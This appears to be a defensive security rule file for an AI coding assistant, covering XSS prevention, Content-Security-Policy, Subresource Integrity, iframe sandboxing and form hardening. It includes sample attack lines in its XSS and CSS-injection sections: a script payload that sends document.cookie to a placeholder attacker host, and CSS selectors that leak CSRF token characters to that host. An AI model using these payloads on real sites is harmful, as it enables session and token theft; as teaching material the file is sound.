# HTML / CSS Security

> Auto-fires on every `*.html`, `*.css`, `*.scss`, `*.module.css`,
> CSP header config, `meta name="referrer"` declarations,
> `<iframe>` / `<form>` / `<a target>` patterns. Standards:
> **OWASP Top 10 — A03 Injection (XSS)**, **OWASP Cross-Site
> Scripting Cheat Sheet**, **OWASP HTML5 Security Cheat Sheet**,
> **Content Security Policy Level 3 (CSP3, W3C)**, **Subresource
> Integrity (SRI, W3C)**, **Trusted Types (W3C)**, **HTML Living
> Standard §sandboxing** (iframe sandbox), **Referrer-Policy
> (W3C)**, **Permissions Policy (W3C)**, **Cross-Origin Opener /
> Embedder / Resource Policy (Fetch Living Standard)**.

## Core Principle

**Every HTML + CSS surface is an XSS target until it isn't. The
default posture is: text content over innerHTML, framework-
escaped templates (never raw concatenation), Trusted Types
mandatory for any `innerHTML`-equivalent sink, strict
Content-Security-Policy with nonces (not unsafe-inline), SRI on
every external resource, sandbox on every iframe that loads
third-party content, modern cross-origin isolation headers
(COOP / COEP / CORP).**

## OWASP Top 10 alignment

### A03 — Injection (Cross-Site Scripting)

The single most-impactful HTML attack vector. Three classes:

#### Reflected XSS

```html
<!-- WRONG — user-supplied query echoed into the DOM unescaped -->
<h1>Search results for: <%= request.query.q %></h1>

<!-- Attacker URL: /search?q=<script>fetch('//evil.example/'+document.cookie)</script> -->
```

#### Stored XSS

```html
<!-- WRONG — comment body rendered without escaping -->
<div class="comment">{{ comment.body | safe }}</div>

<!-- Attacker comment body: <img src=x onerror=...> -->
```

#### DOM-based XSS

```javascript
// WRONG — user input flows to a sink that executes
document.getElementById('greeting').innerHTML = location.hash.slice(1);

// Attacker URL: #<img src=x onerror=...>
```

Mitigation hierarchy (apply ALL):

1. **Framework escaping** — React, Vue, Svelte, Angular, Solid
   all escape by default. NEVER use the "escape hatch" (React
   `dangerouslySetInnerHTML`, Vue `v-html`, Svelte `{@html}`,
   Angular `[innerHTML]`) without a sanitiser.

2. **DOMPurify (or equivalent)** for HTML that must come from
   user content (rich-text editors, markdown rendering):

   ```javascript
   import DOMPurify from 'dompurify';
   element.innerHTML = DOMPurify.sanitize(userInput, {
     ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'li'],
     ALLOWED_ATTR: ['href'],
     ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|\/)/i,
   });
   ```

3. **Trusted Types** — enforce ALL `innerHTML`-equivalent
   sinks accept ONLY Trusted-Type-wrapped values (browser-level
   blockade on string assignments):

   ```http
   Content-Security-Policy: require-trusted-types-for 'script';
                            trusted-types my-policy default;
   ```

   ```javascript
   const policy = window.trustedTypes.createPolicy('my-policy', {
     createHTML: (input) => DOMPurify.sanitize(input),
   });
   element.innerHTML = policy.createHTML(userInput);
   ```

4. **Output encoding** — context-aware: HTML body, HTML
   attribute, JavaScript, CSS, URL. The framework usually
   handles this; custom server-side rendering must apply per-
   context.

### A05 — Security Misconfiguration

#### Strict Content-Security-Policy

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_BASE64}' 'strict-dynamic';
  style-src 'self' 'nonce-{RANDOM_BASE64}';
  img-src 'self' data: https://images.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
  report-uri /csp-violation-report;
  require-trusted-types-for 'script';
  trusted-types my-policy default;
```

Notes:

- `nonce-` uses a per-request crypto-random value (16+ bytes,
  base64-encoded) embedded as `<script nonce="...">`. The nonce
  changes every request.
- `'strict-dynamic'` lets a nonce-loaded script load further
  scripts without listing each origin (avoids hosts allowlists
  going stale).
- `object-src 'none'` blocks `<object>` / `<embed>` / `<applet>`.
- `base-uri 'none'` blocks `<base href>` injection (attack
  vector for rebasing relative URLs).
- `frame-ancestors 'none'` prevents being framed (replaces
  `X-Frame-Options: DENY`).
- `form-action 'self'` restricts form submission targets.
- `report-uri` (or `report-to` for the newer reporting API)
  collects violations.

**Bad CSP shapes to avoid**:

```http
# DON'T — defeats CSP entirely
script-src * 'unsafe-inline' 'unsafe-eval';

# DON'T — allows any HTTPS source
script-src https:;

# DON'T — overly broad allowlist
script-src 'self' https://cdn.jsdelivr.net https://*.googleapis.com;

# DO — nonce + strict-dynamic
script-src 'self' 'nonce-{RANDOM}' 'strict-dynamic';
```

#### Subresource Integrity

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

`integrity` is computed by:

```bash
shasum -b -a 384 lib.js | awk '{print $1}' | xxd -r -p | base64
```

CI verifies the SRI hash matches the bundled file (per
[`common/dependency-pinning.md`](../common/dependency-pinning.md)).

#### Modern security headers

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=(),
                    payment=(self), fullscreen=(self)
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

`X-Frame-Options` is superseded by CSP `frame-ancestors`.
`X-XSS-Protection` is deprecated (modern browsers ignore).

### A07 — Identification + Authentication

#### Forms

```html
<form method="post" action="/login" autocomplete="on">
  <input
    type="email"
    name="email"
    autocomplete="username"
    required
    inputmode="email"
    spellcheck="false"
    autocorrect="off"
  />
  <input
    type="password"
    name="password"
    autocomplete="current-password"
    required
    minlength="12"
  />
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}" />
  <button type="submit">Sign in</button>
</form>
```

- `autocomplete` values from
  [WHATWG autofill](https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#autofill)
  — `username`, `current-password`, `new-password`, `one-time-code`,
  `cc-number`, `cc-csc`, etc. Password managers depend on these.
- CSRF token always present on state-changing forms (per
  framework's CSRF middleware).
- `type="password"` browser-prevents autocomplete leaks.

#### One-time-code inputs

```html
<input
  type="text"
  inputmode="numeric"
  pattern="[0-9]*"
  maxlength="6"
  autocomplete="one-time-code"
  name="otp"
/>
```

iOS Safari auto-fills SMS codes when `autocomplete="one-time-code"`.

### A08 — Software / Data Integrity

#### Iframes — sandbox by default

```html
<!-- User-generated content / third-party widget -->
<iframe
  src="https://widget.example.com"
  sandbox="allow-scripts allow-forms"
  loading="lazy"
  title="Widget description"
></iframe>
```

`sandbox` (empty) is the strictest — disables scripts, forms,
plugins, top-navigation, popups. Grant capabilities back
explicitly. NEVER `sandbox="allow-scripts allow-same-origin"` on
iframes pointing at a different origin — the combination defeats
the sandbox.

#### External links

```html
<a href="https://external.example.com" target="_blank" rel="noopener noreferrer">
  External site
</a>
```

`rel="noopener"` prevents the new window from accessing
`window.opener` (reverse-tabnabbing prevention). Modern browsers
imply this for `target="_blank"`, but explicit is defensive.

### A10 — SSRF (indirect via HTML)

User-supplied URLs that the server fetches (image proxy, link
previewer, OG-tag generator) need server-side allowlist + IP
range validation. Per [`common/security.md`](../common/security.md)
A10.

## CSS-specific security

### CSS injection via attribute selectors

```css
/* Attack: query CSRF tokens character-by-character */
input[name="csrf_token"][value^="a"] {
  background: url('//evil.example/leak?c=a');
}
input[name="csrf_token"][value^="b"] {
  background: url('//evil.example/leak?c=b');
}
/* … 26 rules per character position … */
```

The CSS rule fires when the attribute matches; the URL fetch
leaks the prefix. Mitigations:

- Strict CSP (`style-src 'self' 'nonce-{...}'`) blocks injected
  styles.
- Tokens never live in HTML attribute values that user-supplied
  CSS could read; prefer hidden inputs that aren't selectable
  by attribute prefix.
- For form CSRF tokens, server-side validation is the real
  defence; the CSS exfiltration is a side-channel.

### CSS-driven phishing via `:visited` history sniffing

Modern browsers limit which properties `:visited` can affect
(only colour, NOT layout / background-image). The historical
attack is largely fenced; still: don't expose user-controlled
URLs in `:visited` styles.

### `expression()` in IE-era CSS

```css
/* HISTORICAL — IE expression() executed JavaScript */
width: expression(alert('xss'));
```

IE is no longer a target browser (per `extreme-lint-policy.md`).
Modern browsers ignore `expression()`. Mentioned for legacy
auditing.

### Imported stylesheets

```css
/* Each @import is an extra HTTP request */
@import url("https://fonts.googleapis.com/css2?family=Inter");
```

`@import` from a different origin:

- Slower (blocks rendering until fetched).
- CSP `style-src` must include the source.
- SRI not supported on `@import` (CSP nonce on a `<link>` is
  the modern path).

Prefer `<link rel="stylesheet" href="..." integrity="...">` with
SRI over `@import`.

## Form security hardening

### Per-form checklist

- [ ] `method="post"` on state-changing forms (never GET)
- [ ] CSRF token included (framework middleware)
- [ ] `autocomplete` values correct per WHATWG
- [ ] `required` + server-side validation (NEVER client-only)
- [ ] `enctype="multipart/form-data"` for file uploads + server
      size + type validation
- [ ] `inputmode` + `pattern` + `maxlength` to constrain input
- [ ] `accept=".pdf,.jpg"` on `<input type="file">` (UX hint,
      NOT a security boundary)
- [ ] Honeypot field (hidden via CSS, server rejects if filled)
      for bot mitigation OR proper bot management (Turnstile,
      hCaptcha, reCAPTCHA)
- [ ] Rate limit on form-submission endpoint (per
      [`common/rate-limiting.md`](../common/rate-limiting.md))

## File upload security

```html
<form method="post" action="/upload" enctype="multipart/form-data">
  <input
    type="file"
    name="avatar"
    accept="image/jpeg,image/png,image/webp"
    required
  />
  <button type="submit">Upload</button>
</form>
```

`accept` is UI-only — server MUST validate:

1. File size (HTTP body size limit at the proxy + per-request
   max in the framework).
2. Magic number / content type (not the extension).
3. Re-encode images server-side (strip EXIF; strip embedded JS
   in SVG).
4. Store with random server-generated filename.
5. Serve from a separate origin or a `Content-Disposition:
   attachment` header for non-image files.

## Inline event handlers — banned

```html
<!-- WRONG — defeats CSP nonce-based protection -->
<button onclick="submit()">Submit</button>

<!-- RIGHT — externalize -->
<button id="submit-btn">Submit</button>
<script nonce="{{ csp_nonce }}">
  document.getElementById('submit-btn').addEventListener('click', submit);
</script>
```

HTMLHint `inline-script-disabled` + CSP `script-src` without
`'unsafe-inline'` enforces.

## Required tooling

```bash
# CSP analysis
csp-evaluator-cli site.example.com
# Or browser DevTools → Lighthouse → Best Practices

# Security headers scan
curl -I https://site.example.com
# Or run securityheaders.com analyser

# HTML scan
htmlhint src/**/*.html

# CSS scan
stylelint 'src/**/*.css'

# Static security analyser (SAST)
semgrep --config p/owasp-top-ten src/

# Subresource Integrity hash generator
openssl dgst -sha384 -binary lib.js | openssl base64 -A
```

## Cross-references

- [`html-css/coding-style.md`](./coding-style.md) — semantic
  HTML + no inline styles
- [`html-css/patterns.md`](./patterns.md) — accessible component
  patterns + `<dialog>` + Trusted Types
- [`html-css/testing.md`](./testing.md) — axe + security tests
- [`html-css/hooks.md`](./hooks.md) — stylelint + htmlhint + CI
- [`common/security.md`](../common/security.md) — OWASP Top 10
  umbrella
- [`common/secrets-management.md`](../common/secrets-management.md)
  — no inlined secrets
- [`common/dependency-pinning.md`](../common/dependency-pinning.md)
  — SRI on external resources
- [`common/rate-limiting.md`](../common/rate-limiting.md) — form
  submission limits
- [`common/audit-logging.md`](../common/audit-logging.md) —
  security events (login, CSP violations)
- [`typescript/security.md`](../typescript/security.md) —
  framework-side XSS prevention (React, Vue, Svelte)

## Why this rule exists

XSS continues to top OWASP web rankings year after year despite
framework-level protections, because the escape hatches
(`dangerouslySetInnerHTML`, `v-html`, `{@html}`) get used. CSP +
Trusted Types provide DEFENCE IN DEPTH so a single framework-
escape-hatch slip doesn't become an account-takeover. The CSP
nonce + `strict-dynamic` pattern survives the lifetime of a
project; allowlist-based CSPs decay (every new CDN, every new
analytics provider, every campaign script tempts widening the
allowlist).

The browser-side controls in this file are the floor. The
server-side authentication / authorisation controls live in
[`common/security.md`](../common/security.md) + framework-
specific files. Both are required.

## Learning hooks

Per [`common/continuous-learning-mandate.md`](../common/continuous-learning-mandate.md):

**Signals to watch**:

- CSP missing or weakened (`'unsafe-inline'` / `'unsafe-eval'` /
  wildcard origin) — rule §A05 violation
- `dangerouslySetInnerHTML` / `v-html` / `{@html}` shipped
  without a sanitiser (rule §A03 weakening)
- `<iframe>` without `sandbox` loading user-controlled URL
  (rule §A08)
- External `<script>` / `<link>` without `integrity=` attribute
  (rule §A08 — SRI weakening)
- Inline event handler (`onclick="..."`, `onload="..."`) shipped
  (CSP defeated)
- Form `method="get"` for state-changing action (security weak)
- Modern security header missing on a new route (HSTS / COOP /
  COEP / Permissions-Policy)
- Trusted Types policy not enforced when CSP supports it
- `:visited` exposed in a way that could be inferred — rare but
  worth grep

**Refinement candidates**:

- New CSP directive when a browser ships a new gate (e.g.,
  Document-Policy, Origin-Agent-Cluster)
- New iframe-pattern row when a recurring third-party widget
  needs documented sandbox profile
- New sanitiser allow-list when a recurring rich-text content
  type emerges
- Tightening of the SRI requirement when supply-chain
  retargeting incidents surface
